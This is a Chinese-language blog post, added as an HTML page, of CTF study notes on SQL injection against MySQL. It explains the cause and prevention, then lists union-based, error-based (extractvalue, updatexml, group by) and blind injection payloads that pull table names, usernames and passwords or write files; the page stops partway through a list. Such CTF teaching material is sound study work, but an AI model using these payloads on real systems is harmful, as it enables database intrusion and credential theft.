@@ -1,0 +1,1026 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一．定义SQL注入（SQL Injection）：是一种将恶意SQL代码插入到应用程序输入参数中的攻击技术，攻击成功后可以获取、篡改或删除数据库数据，甚至控制服务器。 比如使用单引号来破坏SQL的闭合结构。 根本原因：未做参数化，直接拼接用户可控输入。 预编译会预防的原因：SQL 结构先编译固定，用户输入仅作为数据，不会改变语句结构。  分类以及判断方式 数字型注入：判断方法：使用 1 and 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF - sql注入">
+<meta property="og:url" content="https://chiya-66.github.io/2026/07/10/ctfwp-sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="一．定义SQL注入（SQL Injection）：是一种将恶意SQL代码插入到应用程序输入参数中的攻击技术，攻击成功后可以获取、篡改或删除数据库数据，甚至控制服务器。 比如使用单引号来破坏SQL的闭合结构。 根本原因：未做参数化，直接拼接用户可控输入。 预编译会预防的原因：SQL 结构先编译固定，用户输入仅作为数据，不会改变语句结构。  分类以及判断方式 数字型注入：判断方法：使用 1 and 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-10T09:28:45.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.364Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>CTF - sql注入 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF - sql注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-10 17:28" pubdate>
+          2026年7月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF - sql注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一．定义"><a href="#一．定义" class="headerlink" title="一．定义"></a>一．定义</h2><p><strong>SQL注入（SQL Injection）</strong>：是一种将恶意SQL代码插入到应用程序输入参数中的攻击技术，攻击成功后可以获取、篡改或删除数据库数据，甚至控制服务器。</p>
+<p>比如使用单引号来破坏SQL的闭合结构。</p>
+<p><strong>根本原因</strong>：未做参数化，直接拼接用户可控输入。</p>
+<p><strong>预编译会预防的原因</strong>：SQL 结构先编译固定，用户输入仅作为数据，不会改变语句结构。</p>
+<hr>
+<h3 id="分类以及判断方式"><a href="#分类以及判断方式" class="headerlink" title="分类以及判断方式"></a>分类以及判断方式</h3><ul>
+<li><strong>数字型注入</strong>：判断方法：使用 <code>1 and 1=1</code>，<code>1 and 1=2</code> 来判断。当输入 <code>and 1=1</code> 时页面显示正常，<code>and 1=2</code> 时页面显示异常。</li>
+<li><strong>字符型注入</strong>：判断方法：使用 <code>1&#39; and &#39;1&#39;=&#39;1</code>，<code>1&#39; and &#39;1&#39;=&#39;2</code> 来判断。当输入 <code>1&#39; and &#39;1&#39;=&#39;1</code> 时页面显示正常；<code>1&#39; and &#39;1&#39;=&#39;2</code> 时页面显示异常。</li>
+</ul>
+<hr>
+<h2 id="二、注入方式"><a href="#二、注入方式" class="headerlink" title="二、注入方式"></a>二、注入方式</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><blockquote>
+<p><strong>注</strong>：在联合注入的过程中，记得最后加注释符，其中 <code>--</code> 和 <code>#</code>（单行注释符）都可以，其中 <code>--</code> 适用范围更广。</p>
+</blockquote>
+<p><strong>一．用 <code>order by</code> 子句确定数据表字段数。</strong> 输入 <code>id=1&#39; order by 1 --+</code></p>
+<blockquote>
+<p><strong>注</strong>：<code>order by N</code> 是SQL的排序语句，<code>N</code> 代表按第N个字段排序。</p>
+</blockquote>
+<p>以此来确定字段数的最大值，比如字段数的长度为2，则输入2的时候正常，3的时候则报错。</p>
+<p><strong>二．字段数确定后，需构造 <code>union select</code> 语句提取数据库信息。</strong> 大致步骤为：</p>
+<ol>
+<li><strong>让原查询无结果</strong>：将 <code>id</code> 值改为 <code>-1</code>（如 <code>id=-1&#39;</code>），使原查询返回空，触发 <code>union</code> 查询的结果显示。</li>
+<li><strong>匹配字段数拼接查询</strong>：按2个字段构造语句，如输入 <code>id=-1&#39; union select 1,2 --+</code>。假如说执行后页面会显示1和2，说明第1、2个字段是可显示位，后续将占位符替换为查询函数即可。</li>
+<li><strong>提取基础数据库信息</strong>：<code>id=-1&#39; union select 1,database() --+</code>，其中括号是函数的语法特征，用于标识这是一个函数调用，而非普通的字段名或变量。</li>
+<li><strong>提取 <code>security</code> 数据库的所有表名</strong>：<code>?id=-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--</code>（这里的database要换成对应的库名，如 <code>&#39;sqli&#39;</code>）</li>
+</ol>
+<blockquote>
+<p><strong>注</strong>：</p>
+<ul>
+<li><code>information_schema.tables</code> 是MySQL的系统元数据表，存储了所有数据库中所有表的基本信息。</li>
+<li><code>where table_schema=database()</code> 是筛选条件：仅查询当前数据库下的表。</li>
+<li><code>table_name</code> 是系统表字段，代表”表名”。</li>
+<li><code>group_concat()</code> 将所有表名拼接成一个字符串，解决分页显示问题，直接看到全部结果。</li>
+</ul>
+</blockquote>
+<ol start="5">
+<li><strong>提取列名</strong>：<code>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code>（一样，Users要换成对应的表名）</li>
+</ol>
+<blockquote>
+<p><strong>注</strong>：</p>
+<ul>
+<li><code>information_schema.columns</code> 是MySQL的系统元数据表，存储所有数据库中所有表的字段信息。</li>
+<li><code>where table_name=&#39;users&#39;</code> 指筛选条件：仅查询 <code>users</code> 表的字段。</li>
+<li><code>column_name</code> 是系统表字段，代表”字段名”。</li>
+</ul>
+</blockquote>
+<ol start="6">
+<li><strong>提取 <code>users</code> 表的全量账号密码（爆flag）</strong>：<code>-1 union select 1, group_concat(列名) from 表名</code></li>
+</ol>
+<blockquote>
+<p><strong>注</strong>：若为文件导出注入，则在后面加 <code>into outfile &quot;D:/自定义文件名&quot;--+</code></p>
+<p>其中，<code>into outfile</code>：MySQL的文件导出关键字，作用是将 <code>select</code> 查询的结果写入指定路径的文件中；<code>D:/</code> 是磁盘根目录。</p>
+</blockquote>
+<hr>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>当数据库不显示正常查询结果，但会显示报错信息时可使用报错注入。</p>
+<p><strong>常用函数</strong>：<code>extractvalue</code>，<code>updatexml</code>，<code>group by</code>，利用数据库报错直接带出数据。</p>
+<h4 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h4><ul>
+<li><p>❤ <strong>爆破数据库名</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and extractvalue<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x5c,database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x5c<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> #<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破表格名</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and extractvalue<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x5c,<span class="hljs-punctuation">(</span>select group_concat<span class="hljs-punctuation">(</span>table_name<span class="hljs-punctuation">)</span> from information_schema.tables where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x5c<span class="hljs-punctuation">)</span> #<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破字段名</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and <span class="hljs-punctuation">(</span>extractvalue<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x5c,<span class="hljs-punctuation">(</span>select group_concat<span class="hljs-punctuation">(</span>column_name<span class="hljs-punctuation">)</span> from information_schema.columns where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> and table_name=&#x27;表格名&#x27;<span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x5c<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破字段值（flag）</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and <span class="hljs-punctuation">(</span>extractvalue<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x5c,<span class="hljs-punctuation">(</span>select group_concat<span class="hljs-punctuation">(</span>username,password<span class="hljs-punctuation">)</span> from 表格名<span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x5c<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><p>逐步拆解：</p>
+<ol>
+<li><code>updatexml(1,2,1)--+</code></li>
+<li>拼接函数 <code>concat(0x7e,3,0x7e)</code></li>
+<li>SQL查询关键字（<code>select username/password from users limit 0,1</code>）</li>
+</ol>
+<ul>
+<li><p>❤ <strong>爆破数据库名</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; or updatexml<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,concat<span class="hljs-punctuation">(</span>&#x27;#&#x27;,database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破表格名</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; OR UPDATEXML(<span class="hljs-number">1</span>,CONCAT(<span class="hljs-number">0</span>x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema = &#x27;数据库名&#x27; LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>
+<p>使用 <code>LIMIT 0, 1</code> 是为了防止多行结果导致错误。</p>
+</li>
+<li><p>❤ <strong>爆破表格字段</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; OR UPDATEXML<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,CONCAT<span class="hljs-punctuation">(</span>&#x27;#&#x27;,<span class="hljs-punctuation">(</span>SELECT GROUP_CONCAT<span class="hljs-punctuation">(</span>column_name<span class="hljs-punctuation">)</span> FROM information_schema.columns WHERE table_name = &#x27;表格名&#x27;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>获取字段值</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; OR UPDATEXML<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,CONCAT<span class="hljs-punctuation">(</span>&#x27;#&#x27;,<span class="hljs-punctuation">(</span>SELECT GROUP_CONCAT<span class="hljs-punctuation">(</span>CONCAT_WS<span class="hljs-punctuation">(</span>&#x27;:&#x27;,id,username,password<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> FROM 表格名 LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破对应用户的密码</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">123</span>&#x27; and <span class="hljs-punctuation">(</span>updatexml<span class="hljs-punctuation">(</span><span class="hljs-number">1</span>,concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x5c,<span class="hljs-punctuation">(</span>select password from <span class="hljs-punctuation">(</span>select password from users where username=&#x27;用户名&#x27;<span class="hljs-punctuation">)</span> b<span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x5c<span class="hljs-punctuation">)</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h4><ul>
+<li><p>❤ <strong>爆破数据库</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">123</span>&#x27; and <span class="hljs-punctuation">(</span>select count<span class="hljs-punctuation">(</span>*<span class="hljs-punctuation">)</span> from information_schema.tables group by concat<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x5c,floor<span class="hljs-punctuation">(</span>rand<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span>*<span class="hljs-number">2</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破出所有数据库表格</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and <span class="hljs-punctuation">(</span>select count<span class="hljs-punctuation">(</span>*<span class="hljs-punctuation">)</span> from information_schema.tables where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> group by concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x7e,<span class="hljs-punctuation">(</span>select group_concat<span class="hljs-punctuation">(</span>table_name<span class="hljs-punctuation">)</span> from information_schema.tables where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x7e,floor<span class="hljs-punctuation">(</span>rand<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span>*<span class="hljs-number">2</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破字段名</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and <span class="hljs-punctuation">(</span>select count<span class="hljs-punctuation">(</span>*<span class="hljs-punctuation">)</span> from information_schema.columns where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> group by concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x7e,<span class="hljs-punctuation">(</span>select group_concat<span class="hljs-punctuation">(</span>column_name<span class="hljs-punctuation">)</span> from information_schema.columns where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> and table_name=&#x27;users&#x27;<span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x7e,floor<span class="hljs-punctuation">(</span>rand<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span>*<span class="hljs-number">2</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破字段值</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and <span class="hljs-punctuation">(</span>select count<span class="hljs-punctuation">(</span>*<span class="hljs-punctuation">)</span> from information_schema.columns group by concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x7e,<span class="hljs-punctuation">(</span>select group_concat<span class="hljs-punctuation">(</span>username,password<span class="hljs-punctuation">)</span> from users<span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x7e,floor<span class="hljs-punctuation">(</span>rand<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span>*<span class="hljs-number">2</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>❤ <strong>爆破用户密码</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; and <span class="hljs-punctuation">(</span>select <span class="hljs-number">1</span> from<span class="hljs-punctuation">(</span>select count<span class="hljs-punctuation">(</span>*<span class="hljs-punctuation">)</span> from information_schema.columns where table_schema=database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> group by concat<span class="hljs-punctuation">(</span><span class="hljs-number">0</span>x7e,<span class="hljs-punctuation">(</span>select password from users where username=&#x27;用户名&#x27;<span class="hljs-punctuation">)</span>,<span class="hljs-number">0</span>x7e,floor<span class="hljs-punctuation">(</span>rand<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span>*<span class="hljs-number">2</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-keyword">a</span><span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><strong>概念</strong>：在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试（说白了就是猜测内容），这个过程称为盲注。</p>
+<ul>
+<li><strong>布尔盲注</strong>：根据页面真假判断数据。</li>
+<li><strong>时间盲注</strong>：无回显，用 <code>sleep</code> 延时判断。</li>
+</ul>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ol>
+<li><p><strong>猜解当前数据库名的长度</strong>：构建URL：<code>1 and length(database())=所猜测的域名长度 --+</code><br>例如 <code>security</code> 猜测的域名长度为8。</p>
+</li>
+<li><p><strong>逐位猜测数据库的字符以确定数据库的名称</strong>：<code>... and ascii(substr(database(),1,1))=ascii编译前的数字--+</code></p>
+<p>逐步拆解：<code>substr(string, start, length)</code> 的参数分别指字符串，起始位置，长度。</p>
+<ul>
+<li><code>ascii(substr(2,1,1))</code></li>
+<li>数据库 <code>database()</code></li>
+</ul>
+</li>
+<li><p><strong>确定数据库的名称后，尝试爆破出users表名</strong>：<code>... and ascii(substr((select username from security.users limit 0,1),1,1))=115--+</code>（即猜测的第一个字符为s）</p>
+<p>然后逐一尝试。</p>
+</li>
+</ol>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul>
+<li><p><strong>注入类型</strong>：字符型GET注入，无数据回显，仅能通过时间延迟判断SQL语句执行结果。</p>
+</li>
+<li><p><strong>验证注入点</strong>：<code>?id=1&#39; and sleep(5) --+</code> 若页面响应延迟5秒，说明存在单引号闭合的时间盲注漏洞。一般来说后端是单引号、双引号、括号+引号的闭合方式。</p>
+</li>
+<li><p><strong>猜解数据库名长度</strong>：例如 <code>?id=1&#39; and if(length(database())=8,sleep(5),1) --+</code> 延迟则证明当前数据库名长度为8。</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>注</strong>：<code>if(condition, true_value, false_value)</code> 是MySQL条件函数，这是基于时间的盲注关键部分；<code>length(database())=8</code> 是条件判断内容，代表数据库的长度为8；<code>sleep(5)</code> 指条件为真时的执行，代表如果该条件成立，则延迟5秒；<code>1</code> 指条件为假时的执行，指如果长度≠8，即该条件不成立，返回1（正常执行）。</p>
+</blockquote>
+<ul>
